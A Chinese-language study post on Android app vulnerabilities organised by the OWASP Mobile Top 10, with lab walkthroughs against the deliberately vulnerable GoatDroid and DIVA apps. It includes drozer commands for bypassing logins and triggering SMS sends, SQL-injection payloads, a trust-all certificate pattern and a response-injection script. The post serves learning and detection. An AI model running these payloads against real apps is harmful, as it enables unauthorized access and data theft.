---
title: Android APP常见漏洞和挖掘技巧
date: 2018-02-12 00:00:00
categories:
- CTF/Android
tags:
---

## 基本知识
本节内容的安全问题主要属于是Android架构上两层的，即应用框架层和应用层。

### 应用框架层

> 仅仅罗列框架的名字是没有用的，如果不能知道这些框架或者组件如何应用，是无法从根本上理解这个分层结构的（暂时放着等待解决）

- Views
- Content Providers
- Resource Manager
- Notification Manager
- Activity Manager
- Window Manager
- Package Manager

### 应用层
- 系统应用
- 其他应用

### 四大组件

> 应用组件是组成安卓应用的关键部分。每个应用都是由一个或者多个组件组成，并且每个都是单独调用。

- Activity
- Service
- Broadcast Receiver
- Content Provider

### 问题
四大组件是哪层的？

## OWASP top 10

### M1: 平台使用不当
- 概述：平台功能的滥用，或者未能使用平台的安全控制，如Intent的误用、权限误用等
- 风险：很广泛，可能涉及移动平台的各个服务

### M2：不安全的存储
- 概述：包括使用SQL数据库、日志文件、SD卡存储时不安全的数据存储方 式，以及操作系统、开发框架、编译器环境、硬件设备漏洞等导致的非故意的数据泄漏
- 风险：可能会导致数据丢失，或者应用程序中的敏感信息泄漏

### M3：不安全的通信
- 概述：从A点到B点之间不安全地获取数据的所有方面，包括移动设备之间 的通信、应用程序至服务器之间的通信、移动设备至其他设备的通信等，涉及的通信方式包括TCP/IP、 WiFi、蓝牙、NFC、音频、红外、GSM、 3G、短信等
- 风险：可能会导致中间人攻击:包括数据窃听、数据篡改回放等

### M4：不安全的身份验证
- 概述：包括对终端用户身份验证或会话管理的问题，例如使用不安全的信 道进行身份验证而导致欺骗、重放或其他针对身份验证的攻击
- 风险：APP客户端或服务端可能会向未识别身份的用户暴露数据或提供服务

### M5：加密不足
- 概述：使用不当的加密方法对敏感信息进行加密，例如使用了不安全或过 时的加密算法、密钥管理不当(弱密钥、硬编码密钥)、使用了存在漏洞的自定义加密算法等
- 风险：数据机密性受到破坏(数据破解)或者数据完整性受到破坏(数据伪造攻击)

### M6：不安全的授权
- 概述：不安全的授权管理，如果移动终端APP包含不安全的直接对象引用 (IDOR)、隐藏的服务端接口、通过数据请求传递用户角色或权限信息等，则可能会存在不安全的授权问题
- 风险：对未经授权的用户授予访问权限，未授权用户可执行他们本不能执 行的创建、读取、更新、删除(CRUD)等操作，可以使用本没有授予他 们的服务

### M7：客户端代码质量问题
- 概述：移动客户端代码级别开发问题，包括缓冲区溢出、字符串格式漏洞以及其他不同类型的代码级错误
- 风险：允许攻击者利用错误的业务逻辑，或通过漏洞绕过设备上的安全控制，或以意外的方式暴露敏感数据

### M8：代码篡改
- 概述：包括对APP的二进制修补、本地资源修改、API Hook和动态内存修改等
- 风险：攻击者通过对代码篡改可以改变应用程序的运行逻辑、在合法应用 程序中植入恶意代码、改变或中断向服务端的网络流量等

### M9：逆向工程
- 概述：缺少代码混淆和加固手段，导致APP二进制文件容易被进行逆向分析
- 风险：攻击者能通过逆向工程观察到程序代码、工作逻辑以及代码中的加 密常数、密码等信息，能够对APP进行重打包

### M10：无关功能
- 概述：在应用程序中启用了不打算发布的功能(如测试后门、调试信息打印、暂时禁用的安全验证、额外权限等)
- 风险：攻击者可能通过这些额外的功能窃取敏感数据或使用未经授权的功能

## 典型漏洞及挖掘方法
### 数据存储漏洞(M1&M2)
- Android系统中本地的存储位置包括
    - Shared Preferences
        - 基于XML文件的key-value数据存储方式，一般用于储存应用的配置等信息
        - 常规位置: /data/data/<package-name>/shared_prefs/*.xml
    - SQLite Databases
        - 轻量级的关系型数据库
        - 常规位置: /data/data/<package-name>/database/*.db
    - Internal Storage
        - 使用设备内部存储器来创建和保存文件，通常情况下内部存储的文件只能被该当前程序访问，不可被其他程序或用户访问 
        - 常规位置: /data/data/<package-name>/files/*
    - External Storage
        - 使用外部存储器(如sd卡等)创建和保存文件，以这种方式创建的文件通常是全局可读的，可被所有具有“READ_EXTERNAL_STORAGE”或“WRITE_EXTERNAL_STORAGE”权限的APP 访问
        - 其常规路径为:/mnt/sdcard/*
#### 成因
- 创建以上文件时没有使用MODE_PRIVATE模式，而是使用了MODE_WORLD_READABLE或MODE_WORLD_WRITEABLE模式，导致其他程序可以读取内容。
- 即一般来说/data/data/<package-name>/目录下的文件是其他用户不可读的，但是如果使用不恰当的方式创建将会改变文件权限，这样便可能将私密文件泄露给其他用户。

#### 检测
1. 使用adb shell连接手机并获取root权限，浏览/data/data/<package-name>目 录下的shared_pref、database、files等目录，检查是否存在others用户可读 的文件
2. 检查shared_pref配置文件、数据库、内部和外部存储的文件中是否明文存 储了敏感信息

### 数据通信漏洞(M3)
#### 敏感信息明文传输漏洞
明文直接传，没什么好说的，攻击者通过局域网嗅探、恶意公共WIFI、恶意代理服务、DNS劫持等手段可以捕获客户端和服务端之间的明文通信，获取用户账号密码、登陆 session等敏感信息或者发起中间人攻击(MITM)。
#### SSL证书弱校验漏洞
##### 成因
不对Server端证书进行校验导致的TLS中间人攻击，开发者在校验证书时需要实现X509TrustManager类，包括checkClientTrusted、 checkServerTrusted、getAcceptedIssuers三个方法，如下：

```java
private class MyTrustManager implements X509TrustManager{  
  
                @Override  
                public void checkClientTrusted(X509Certificate[] chain, String authType)  
                                throws CertificateException {  
                        // TODO Auto-generated method stub  
                          
                }  
  
                @Override  
                public void checkServerTrusted(X509Certificate[] chain, String authType)  
                                throws CertificateException {  
                        // TODO Auto-generated method stub  
                          
                }  
  
                @Override  
                public X509Certificate[] getAcceptedIssuers() {  
                        // TODO Auto-generated method stub  
                        return null;  
                }          
    }    
```

1. 如果客户端APP在实现X509TruestManager类的checkServerTrusted 方法时，函数体为空，则不对服务端证书进行校验，会导致SSL证书弱校验漏洞。
2. 如果客户端APP在使用HttpsURLConnection时，实现自定义 HostnameVerifier过程中未对主机名做验证，则默认不检查证书域名与站点域名是否匹配;或者在设置HttpsURLConnection的HostnameVerifier时，将其设为ALLOW_ALL_HOSTNAME_VERIFIER，则接受所有域名。这种不当的编程方式会导致SSL证书弱校验。

##### 检测
1. 终端检测：对存在SSL证书弱校验漏洞的APP实施HTTPS中间人攻击
- 开启Fiddler的HTTPS解析功能，生成并导出自签名证书，安装到手机中
- 开启Fiddler代理，并允许远程主机连接该代理
- 配置手机使其使用Fiddler提供的代理
- 执行APP并进行网络操作，在Fiddler中查看捕获的数据
- 检查是否能获得HTTPS通信的明文数据
2. 代码检测
- 搜索 .method public checkServerTrusted([Ljava/security/cert/X509Certificate;Ljava/lang/String;)V
- 定位.method和.end method中间的函数体
- 检测是否仅有 return-void
- 同理检测verify(String,SSLSession) 函数体或者否存在SSLSocketFactory.ALLOW_ALL_HOSTNAME_VERIFIER


#### 使用Xposed框架绕过SSL强校验
对SSL强校验使用的函数进行Hook，强制使得校验结果为True。
### 组件暴露漏洞(M1&M6)
#### 成因
- android:exported
是Activity，Service，Provider，Receiver 组件中都 有的一个属性。用来标识是否支持其它应用调用当前组件。
- 如果有intent-filter，默认值为true; 没有intent-filter，默认值为false
-  exported的组件可以被第三方APP调用，在权限控制不当的情况下，可能导致敏感信息泄露、绕过认证、越权行为执行等风险
#### 案例
- 华为网盘(V7)客户端Activity组件暴露导致本地密码绕过(WooYun-2014-048502)  
http://wy.hx99.net/bug_detail.php?wybug_id=wooyun-2014-048502
- 小米bugreport程序Receiver组件暴露导致敏感信息暴露 (WooYun-2012-08222)  
 http://wy.hx99.net/bug_detail.php?wybug_id=wooyun-2012-08222
#### 检测
1. 手动查看
- 获取AndroidManifest.xml文件
    - 反编译获得
    - 使用Re浏览器查看/data/app/<package-name>/*.apk，选择查看 AndroidManifest.xml
- 查看Activity、Receiver、Service、 Provider等组件是否被导出或默认导出
    - 具有intent-filter标签时，默认为exported=true
    - 不具有intent-filter标签时，默认为exported=false
- 导出的组件是否有signature以上级别的权限控制
2. 使用drozer

```bash
dz> run app.package.attacksurface <package-name> //查看暴露组件
dz> run app.activity.info -a <package-name> -i //查看activity信息
dz> run app.service.info -a <package-name> -i //查看service信息
dz> run app.broadcast.info -a <package-name> -i //查看broadcast receiver信息
```

#### 实验
##### Activity暴露导致绕过认证
> http://bobao.360.cn/learning/detail/122.html  
apk样本: https://pan.baidu.com/s/1eSZZZyi  密码:x07t
- 可以反编译manifest文件查看组件的导出选项是否为ture
- 或者采用drozer来自动分析app的攻击面

1. 查看攻击面，发现两个导出的Activity

```bash
dz> run app.package.attacksurface com.isi.testapp
Attack Surface:
  2 activities exported
  0 broadcast receivers exported
  0 content providers exported
  0 services exported
    is debuggable
```

2. 查看Activity具体信息，获得两个Activity名字
```bash
dz> run app.activity.info -a com.isi.testapp -i
Package: com.isi.testapp
  com.isi.testapp.MainActivity
    Permission: null
    Intent Filter:
      Actions:
        - android.intent.action.MAIN
      Categories:
        - android.intent.category.LAUNCHER
  com.isi.testapp.Welcome
    Permission: null
```

3. 尝试启动Welcome这个Activity，的确绕过了MainActivity的登录验证

```bash
$ adb shell am start –n com.isi.testapp/.Welcome
```

4. 这个是否多此一举呢？想看Welcome的Activity直接在layout看这个活动的布局不可以么？我们反编译apk找到这个布局文件来看一下!

```xml
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout android:layout_height="fill_parent" android:layout_width="fill_parent" android:orientation="vertical" xmlns:android="http://schemas.android.com/apk/res/android">
    <Gallery android:background="@drawable/infosec" android:id="@id/gallery1" android:layout_gravity="center" android:layout_height="234.0dip" android:layout_marginTop="40.0dip" android:layout_width="278.0dip" />
    <TextView android:id="@id/tvdisplay" android:layout_gravity="center" android:layout_height="wrap_content" android:layout_marginTop="20.0dip" android:layout_width="wrap_content" android:text="Private Area" android:textColor="#ff0000ff" android:textSize="40.0dip" android:typeface="monospace" />
</LinearLayout>
```

如果将这个layout渲染过后的确可以看到和启动活动的一样的效果，但这是因为这个布局是写死的静态，如果这个Activity运行起来布局信息将作出更改，则我们也许可以看到一些敏感的信息，如案例中的华为网盘。

##### BroadcastReceiver暴露导致发送短信

> 样本fourgoats.apk介绍  
出自OWASP的GoatDroid项目，集成了一堆漏洞的APK，代码未经过混淆与加密，可以反编译后看到比较清晰的逻辑，分析漏洞成因。虽然是许多年前的项目，很多漏洞也早已消失，但对于入门的新手来说还是有一定的价值的。下载地址：https://pan.baidu.com/s/1o957Nku  密码:ssz9  

1. 查看攻击面，找到一个导出的广播接收器

```bash
dz> run app.package.attacksurface org.owasp.goatdroid.fourgoats
Attack Surface:
  4 activities exported
  1 broadcast receivers exported
  0 content providers exported
  1 services exported
    is debuggable
```

2. 查看Broadcast具体信息，找到广播的类名，以及注册的Intent的动作

```bash
dz> run app.broadcast.info -a org.owasp.goatdroid.fourgoats -i
Package: org.owasp.goatdroid.fourgoats
  org.owasp.goatdroid.fourgoats.broadcastreceivers.SendSMSNowReceiver
    Intent Filter:
      Actions:
        - org.owasp.goatdroid.fourgoats.SOCIAL_SMS
    Permission: null
```

3. 如何利用？视频中老师直接给出以下这条命令：

```bash
dz> run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --extra string phoneNumber 10010 --extra string message hacked!

```

- 但是很奇怪这里phoneNumber以及message这个变量名字是如何得到的呢？还是只要是发送短信的广播接收器通用接受这两个参数？其实当然不是了。在上课的时候老师跳过了这个步骤，这里应当继续找到这个广播接收器的代码实现。  
- 因为软件没有加壳没有混淆，所以反编译后目录结构清楚，很容易找SendSMSNowReceiver结果如下：

```java
package org.owasp.goatdroid.fourgoats.broadcastreceivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import org.owasp.goatdroid.fourgoats.misc.Utils;

public class SendSMSNowReceiver extends BroadcastReceiver {
    Context context;

    public SendSMSNowReceiver() {
        super();
    }

    public void onReceive(Context arg8, Intent arg9) {
        this.context = arg8;
        SmsManager v0 = SmsManager.getDefault();
        Bundle v6 = arg9.getExtras();
        v0.sendTextMessage(v6.getString("phoneNumber"), null, v6.getString("message"), null, null);
        Utils.makeToast(this.context, "Your text message has been sent!", 1);
    }
}
```

- 在这里我们获取到参数名字，于是可以开心通过Intent去调用SOCIAL_SMS（在Manifest中注册的名字，不是类名SendSMSNowReceive）

```bash
dz> run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --extra string phoneNumber 10010 --extra string message hacked!
```

4. 这里是发送短信，上课的时候我以为是接收短信，是否可以伪造接受短信呢？

答案是确定的，当系统本身的短信服务**com.android.mms.transaction.SmsReceiverService**出了问题的时候也许就可以去伪造一封短信了。请自行研究。

5. 引用  

Android安全项目入门篇  
https://bbs.pediy.com/thread-219107.htm  
Android应用渗透测试  
http://blog.csdn.net/starflier/article/details/21229301

#### 防护
对导出组件的权限控制

> 如果开发者需要对自己的应用程序或服务(尤其exported的)进行访问控制，可 以在AndroidManifest.xml中添加<permission>标签，将其属性中的 protectionLevel设置为以下级别中的一种:
-  normal:低风险权限，运行时系统会自动授予权限给 app
- dangerous:高风险权限，系统不会自动授予权限给 app，在用到的时候会，会给用户提示
- signature:签名权限，将权限授给具有相同数字签名的应用程序
- signatureOrSystem:签名或系统权限，将权限授给具有相同数字签名的应用程序或系统类app  

思考：是否可以通过验证启动方式来防护呢？

### webview漏洞(M1&M6)

WebView是一个显示网页的控件：
- Android4.4版本以下系统里，WebView基于WebKit
- Android4.4及以上版本系统里，WebView基于Chromium，支持 HTML5 、Javascript等

> WebView是Android组件漏洞的重灾区，主要包括以下下三种类型的漏洞: http://blog.csdn.net/carson_ho/article/details/64904635

#### 任意代码执行

##### 久远的CVE

- CVE-2012-6636  
> http://cve.scap.org.cn/CVE-2012-6636.html

使用了addJavaScriptInterface()的Webview，会向网页中的JS脚本导出一个Object，并利用该Object与本地App的Java代码通信。由于Java支持反射，因此在JS代码中可以利用这个导出的 Object来反射调用本地代码，从而导致攻击者可以构造包含JS的网页利用App具有的权限执行任意代码。

- CVE-2014-1939
> http://cve.scap.org.cn/CVE-2014-1939.html

Android 3.0以后的系统中通过addJavaScriptInterface()添加了一个SearchBoxImpl类的对象 searchBoxJavaBridge_，攻击者通过searchBoxJavaBridge_对象就可以进行反射，从而进行任 意代码执行。

- CVE-2014-7224
> http://cve.scap.org.cn/CVE-2014-7224.html 

当系统辅助功能中的任意一项服务被开启后，由系统提供的WebView会被加入两个JS两个 对象accessibility和accessibilityTraversal，攻击者可以使用”accessibility” 和 “accessibilityTraversal” 这两个Java Bridge来执行远程攻击代码

##### 如今的漏洞
Android 4.2之后，只有以@JavascriptInterface进行注解的方法才能被JavaScript调用。那么是否还存在通过JAVA的反射机制来执行任意代码呢？(留)

##### 检测
1. 代码检测(Android 4.2以上)
- 使用apktool等工具将APK文件反编译为smali代码
- 查找通过addJavascriptInterface注册的方法 Landroid/webkit/WebView;->addJavascriptInterface(

- 通过逆向分析，检查该方法是否对用户输入进行合规性检测和过滤

2. 终端检测（编写网页）
- 即终端的webview控件便于控制，直接访问构造好的网页即可。

```html
<html>
	<head> <meta charset="UTF-8" /> </head>
<body>
<p>如果当前 app 存在漏洞，将会在页面中输出存在漏洞的接口</p> 
<script type="text/javascript">
function check(){
	for (var obj in window){
		try{
			if (“getClass” in window[obj]){
				try{
					window[obj].getClass();
					document.write('<span style="color:red">'+obj+'</span>'); document.write('<br />');
					}catch(e){} 
			}
		}catch(e){} 
	}
}check();
</script></body></html>
```

3. 终端检测（Fiddler）

> Fiddler能记录所有客户端和服务器通信的http(s)请求，能够监视、设置断点、修改输入输出数据，能够编写事件脚本程序进行扩展
https://www.secpulse.com/archives/5525.html

- 即终端的webview控件不便控制
- 在FiddlerScript中的OnBeforeResponse中加入以下代码 
- 将手机的网络设置为使用Fiddler的代理
- 运行APP，任意webview访问任意网页时都会被插入WebView测试代码

```javascript
oSession.utilDecodeResponse(); if(oSession.oResponse.headers.ExistsAndContains("Content-Type ","text/html") || oSession.utilFindInResponse("<html",false)>-1){ var oBody = System.Text.Encoding.UTF8.GetString(oSession.respo nseBodyBytes);
oBody = oBody.ToLower();
var str=”<p>WebView Test</p><script type=\"text/javascript\">v ar str=\"\";for (var obj in window) {try {if (\"getClass\" in window [obj]) {try{window[obj].getClass();str=str+obj;str=str+\"\<br>\";}c atch(e){}}}catch(e) {}}if(str!=\"\"){document.write('<span style=\" color:red\">'+str+'</span>');}</script>"; if(oSession.utilFindInResponse("<head",false)>-1){
oBody = oBody.Replace("<head>","<head>"+str);
}else{
oBody = oBody.Replace("<body>","<body>"+str);
}
oSession.utilSetResponseBody(oBody);
}}
```

#### 域控制不严格导致敏感信息泄露
> http://blogs.360.cn/360mobile/2014/09/22/webview%E8%B7%A8%E6%BA%90%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/

这里的域控制指的就是同源策略中的域，不过并不是webview对http协议中的域控制出了问题，而是对**file协议中域的处理**出了问题。
对于file协议的同源性判断，不同浏览器在不同时期都是不同的：
- 当javascript脚本通过非file url（如http url）加载执行时，file url都被判断为非同源url,这样可以阻止http页面中的javascript读取本地文件。
- 当javascript通过file url加载执行时，有的浏览器允许JS访问所有的本地文件，有的以目录作为同源性判断条件，有的仅仅允许访问url特指的文件。在file url的javascript中访问其它协议的资源，也是不同时期不同的浏览器有不同标准，有的允许在file协议中通过XmlHttpRequest请求http资源，有的则不允许。

我们知道因为sandbox的存在，Android中的各应用是相互隔离的，在一般情况下A应用是不能访问B应用的文件的，但不正确的使用WebView可能会打破这种隔离，从而带来应用数据泄露的威胁，即A应用可以通过B应用导出的Activity让B应用的Webview加载一个恶意的file协议的url，指向一个其中包括着读取本地敏感信息并且发送给远端js脚本的html页面，从而可以获取B应用的内部私有文件。 

##### 成因

> APP中的WebView如果打开了对JavaScript的支持，同时未对file:/// 形式的URL做限制，会导致cookie、私有文件、数据库等敏感信息泄漏。

这里要关注4个API来理解WebView中file协议的安全性：

```java
public class WebViewActivity extends Activity {
    private WebView webView;
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_webview);
        webView = (WebView) findViewById(R.id.webView1);
        //webView.getSettings().setAllowFileAccess(false);                    (1)
        //webView.getSettings().setJavaScriptEnabled(true);                   (2)
        //webView.getSettings().setAllowFileAccessFromFileURLs(true);       (3)
        //webView.getSettings().setAllowUniversalAccessFromFileURLs(true); (4)
        Intent i = getIntent();
        String url = i.getData().toString();
        webView.loadUrl(url);
    }
 }
```

1. setAllowFileAccess   
- 默认值是允许（不安全）
- 通过这个API可以设置是否允许WebView使用File协议
- 如果不允许使用File协议，则不会存在下述的各种跨源的安全威胁，但同时也限制了webview的功能，使其不能加载本地的html文件。

2. setJavaScriptEnabled 

- 默认是不允许（安全，但一般会被开发者打开）
- 通过此API可以设置是否允许WebView使用JavaScript
- 但很多应用，包括移动浏览器为了让WebView执行http协议中的javascript，都会主动设置允许WebView执行Javascript，而又不会对不同的协议区别对待。
- 比较安全的实现是如果加载的url是http或https协议，则启用javascript,如果是其它危险协议，如是file协议，则禁用javascript。

> 禁用file协议的javascript可以很大程度上减小跨源漏洞对WebView的威胁。当然，禁用file协议的javascript执行并不能完全杜绝跨源文件泄露。例如，有的应用实现了下载功能，对于不可渲染的页面，会自动下载到sd卡中，由于sd卡中的文件所有应用都可以访问，于是可以通过构造一个file URL指向被攻击应用的私有文件，然后用此URL启动Activity，就可以在SD卡中读取被攻击应用的私有文件了。

3. setAllowFileAccessFromFileURLs  

- JELLY_BEAN及以后的版本中默认是禁止（安全）
- JELLY_BEAN以前的版本默认是允许
- 通过此API可以设置是否允许通过file
url加载的Javascript读取其他的本地文件

4. setAllowUniversalAccessFromFileURLs  

- JELLY_BEAN及以后的版本中默认是禁止（安全）
- JELLY_BEAN以前的版本默认是允许
- 通过此API可以设置是否允许通过file url加载的Javascript可以访问其他的源，包括其他的文件和http,https等其他的源

> 即使是AllowUniversalAccessFromFileURLs和AllowFileAccessFromFileURLs都为False的情况下，攻击者通过符号链接攻击依旧可以访问本地文件，前提是允许file URL执行javascript(代码中包含view.getSettings().setJavaScriptEnabled(true);

##### 检测

1. 代码检测，使用apktool等工具将APK文件反编译为smali代码
    - 检查是否同时满足以下两个条件：
        - 1. setAllowFileAccess是否配置为true或默认值
            - 搜索Landroid/webkit/WebSettings;->setAllowFileAccess(Z)V  
            - 判断对寄存器的赋值:const v1 0x1
        - 2. setJavaScriptEnabled是否配置为true
            - 搜索Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V  
            - 判断对寄存器的赋值:const v1 0x1  
    - 检查setAllowFileAccessFromFileURLs 或setAllowUniversalAccessFromFileURLsAPI是否配置为true
        - 搜索Landroid/webkit/WebSettings;-> setAllowFileAccessFromFileURLs(Z)V和 Landroid/webkit/WebSettings;-> setAllowFileAccessFromFileURLs(Z)V  
        - 判断对寄存器的赋值:const v1 0x1

##### 实验

（后续补）

##### 防护

1. 对于不需要使用file协议的应用，禁用file协议
2. 对于需要使用file协议的应用，禁止file协议调用javascript

##### 应用克隆

> https://www.zhihu.com/question/265341909

#### 密码明文存储

##### 成因

- WebView中如果没有设置setSavePassword(false)，当用户选择保存在WebView中输入的用户名和密码，则会被明文保存到app目录下的databases/webview.db中
- 具有root权限的攻击者可以获取明文保存的密码，导致敏感数据泄露

##### 检测

- 将APK文件反汇编为smali代码
- 查找是否存在WebSettings.setSavePassword(true)的smali代码:
    - Landroid/webkit/WebSettings;->setSavePassword(Z)V
    - 判断寄存器的赋值:const v1 0x1

### SQL注入漏洞(M7)

#### 成因

在使用sqlite数据库时没有采取合适的过滤输入方法，导致sql语句可被拼接以及改写。Android应用一般在如下两个位置来完成数据库的操作：即Content Providers和Activity中。

#### sqlite

1. Android中的数据库实现为sqlite，一种轻量级基于文件的数据库。
2. 一个数据库就是一个db文件，一般保存在/data/data/<package-name>/databases/*.db
3. db文件可以使用支持查看sqlite的软件打开，如navicat，SQLiteManager等，或者使用sqlite命令直接进入数据库的命令行模式。
4. 在创建时权限一般为其他用户不可访问的私有数据，权限配置不当会出现数据存储漏洞（漏洞1）。当然root权限可以直接拿到。
5. sqlite本身不提供加密，但是仍可使用相应的工具对数据库文件进行加密，如SQLCipher，微信中的EnMicroMsg.db就是采取这种方式加密的。
6. 即使是本地加密了数据库，本质上仍是把钥匙和锁放在一起，并没太大作用，破解者可以通过逆向的方式找到加密秘钥。

#### 实验

> 实验apk为DIVA，一个故意设计的存在很多漏洞的Android app
链接:https://pan.baidu.com/s/1i63a9OL  密码:qrx4

##### DIVA

> Android App常见安全问题演练分析系统-DIVA-Part1
https://www.anquanke.com/post/id/84603

> Android App常见安全问题演练分析系统-DIVA-Part2
https://www.anquanke.com/post/id/86057


##### Content Providers中注入
> ContentProvider使用场景解读
https://www.jianshu.com/p/cdef889736ec
###### 条件
1. Content Providers组件暴露
2. 没有对输入进行有效的过滤
###### 检测
使用drozer进行检测：发现在Projection和Selection处均存在注入

```bash
dz>run scanner.provider.injection -a jakhar.aseem.diva
Scanning jakhar.aseem.diva...
Not Vulnerable:
  content://jakhar.aseem.diva.provider.notesprovider
  content://jakhar.aseem.diva.provider.notesprovider/

Injection in Projection:
  content://jakhar.aseem.diva.provider.notesprovider/notes/
  content://jakhar.aseem.diva.provider.notesprovider/notes

Injection in Selection:
  content://jakhar.aseem.diva.provider.notesprovider/notes/
  content://jakhar.aseem.diva.provider.notesprovider/notes
```


###### 分析
1. Projection和Selection是啥?

ContentProvider中重写了query方法

```java
@Override
public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder)

其中Projection和Selection为query函数的参数，这两个参数会被拼接到sql语句中，位置如下:

select (projection) from tablename where (selection)
```

2. 查看DIVA反编译结果
```java
  public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
        SQLiteQueryBuilder queryBuilder = new SQLiteQueryBuilder();
        queryBuilder.setTables(TABLE);
        switch (urimatcher.match(uri)) {
            case 1:
                break;
            case 2:
                queryBuilder.appendWhere("_id=" + uri.getLastPathSegment());
                break;
            default:
                throw new IllegalArgumentException("Divanotes(query): Unknown URI " + uri);
        }
        if (sortOrder == null || sortOrder == "") {
            sortOrder = C_TITLE;
        }
        // 到此为止并没对projection, selection进行过滤，直接使用参数进行数据库的操作了
        Cursor cursor = queryBuilder.query(this.mDB, projection, selection, selectionArgs, null, null, sortOrder);
        cursor.setNotificationUri(getContext().getContentResolver(), uri);
        return cursor;
    }
```

###### 注入
使用drozer注入:这里我们使用projection参数注入，当然也可以采用selection注入，不过payload有不同
1. 爆出表名

```bash
run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes --projection "* FROM SQLITE_MASTER WHERE type='table';--"
```

> SQLite数据库中有一个内置表,名为SQLITE_MASTER,此表中存储着当前数据库中所有表的相关信息
2. 爆出表中数据

```bash
run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes --projection "* FROM notes ;--"
```

##### Activity中注入
就是整个操作数据库的逻辑在Activity中完成，DIVA中的第七关
###### 检测
因为这种在Activity的操作不方便自动检查，只能去看源码:DIVA中SQLInjectionActivity
```java
    public void search(View view) {
        EditText srchtxt = (EditText) findViewById(R.id.ivi1search);
        try {
        //直接拼接输入框中的字符串，没有任何过滤
            Cursor cr = this.mDB.rawQuery("SELECT * FROM sqliuser WHERE user = '" + srchtxt.getText().toString() + "'", null);
            StringBuilder strb = new StringBuilder("");
            if (cr == null || cr.getCount() <= 0) {
                strb.append("User: (" + srchtxt.getText().toString() + ") not found");
            } else {
                cr.moveToFirst();
                do {
                    strb.append("User: (" + cr.getString(0) + ") pass: (" + cr.getString(1) + ") Credit card: (" + cr.getString(2) + ")\n");
                } while (cr.moveToNext());
            }
            Toast.makeText(this, strb.toString(), 0).show();
        } catch (Exception e) {
            Log.d("Diva-sqli", "Error occurred while searching in database: " + e.getMessage());
        }
    }
```

###### 注入
直接输入框爆出所有用户名密码

```bash
'or'1'='1
```

#### 防护
无论是哪种方式来操作数据库都应该做好输入的过滤，并且保护好db文件，可采用适当的方式加密
#### 微信数据库破解
> http://blog.csdn.net/qq_24280381/article/details/73521836
#### SQLCipher之攻与防
> http://www.freebuf.com/articles/database/108904.html
### logcat数据泄露漏洞(M10)
#### 成因
在APP的开发过程中，为了方便调试，开发者通常会用logcat输出info、debug、error 等信息。如果在APP发布时没有去掉logcat信息，可能会导致攻击者通过查看logcat日志获得敏感信息。
- log.v :详细信息
- log.d: debug信息 
- log.i: info信息
- log.w: warning信息
- log.e: Error信息
#### 检测
1. 静态检测  
- 使用apktool等工具将APK文件反编译为smali代码，检索是否有logcat操作,例如:

```smali
Landroid/util/Log;->d( 
Landroid/util/Log;->v(
```

2. 动态检测
- 启动android sdk中的ddms或monitor
- 打开app并操作，在ddms窗口中选择app并设置要观测的tag，观察logcat日志中是否有敏感内容
## 流程总结
![image](http://ww3.sinaimg.cn/large/0060lm7Tly1fo3htlr2r7j31kw0e6dv6.jpg)

### 静态分析（检测）
> 快速检测，获得分析重点目标

使用apktool等工具对APK文件进行反编译，对反编译得到的文件和代码进行分析：
- AndroidManifest文件分析，检查Activity、Service、Receiver、Provider等组件是否存在暴露风险
- Smali代码分析，通过自动化脚本检测已知特征的漏洞风险，如数据存储漏洞、SSL证书校验漏洞、弱加 密漏洞、webview漏洞等

### 动态分析（验证）
> 对疑似风险进行验证和危害评估，主要是验证静态分析出来的风险

- 调试模式分析：使用adb调试模式进行分析
    - 验证组件暴露风险
    - 验证数据存储风险等
- APP人工操作：人工运行和操作APP的各项功能
    - 熟悉其功能和逻辑
    - 对可能存在的通用控件漏洞或控件使用不当造成的漏洞(如webview等)进行验证
- 网络数据分析：使用抓包工具，或者Fiddler等代理工具捕获分析 http(s)数据
    - 重点针对可能包含敏感数据传输的网络接口(如登陆信息、订单信息、 用户信息等) 
    - 明文传输漏洞验证:是否采用明文传输敏感信息(密码等)
    - SSL弱加密漏洞验证:使用Fiddler自签名证书进行内容还原
    - SSL强加密:使用Xposed插件进行绕过
    - 服务端接口分析:是否存在测试接口、未进行身份验证的接口、可暴力爬取敏感数据的接口等

### drozer（检测+验证）
> 集成静态分析与动态验证的工具，按照逻辑属于动态分析中的调试模式分析。
- 检测组件暴露、SQL注入等漏洞初步检测
- 如果存在以上漏洞，验证其风险，是否否导致敏感数据泄漏、验证绕过、非授权操作等。

### 逆向分析（CTF重点）
- Java文件逆向分析：  
采用SDK编写的代码，通过dex2jar、JD-GUI等工具可将其还原为java代码
- So文件逆向分析：  
采用NDK编写的代码，使用IDA加载so文件进行分析，使用Hex-rays插件将函数体转为C 语言
- 半调试半逆向：  
对于一些重要变量的值，可通过在smali代码中添加logcat代码，然后重打包生成新的APK 文件，运行该APK文件时通过DDMS查看logcat的输出
加密破解以及对逻辑和代码的进一步分析

### 自动化辅助

#### 开源系统

- MobSF  
包含Web界面 支持静态和动态分析，App后端Web API漏洞检测
- Marvin  
包括前端Web界面，部署麻烦 支持静态分析、动态分析、APP Ui自动遍历
- Inspeckage  
Xposed插件，包含WEB界面
能够查看Manifest信息、文件内容、Logcat日志、网 络通信等，能够调用未导出组件

#### 在线系统

腾讯御安全，阿里聚安全，360显危镜，梆梆，娜迦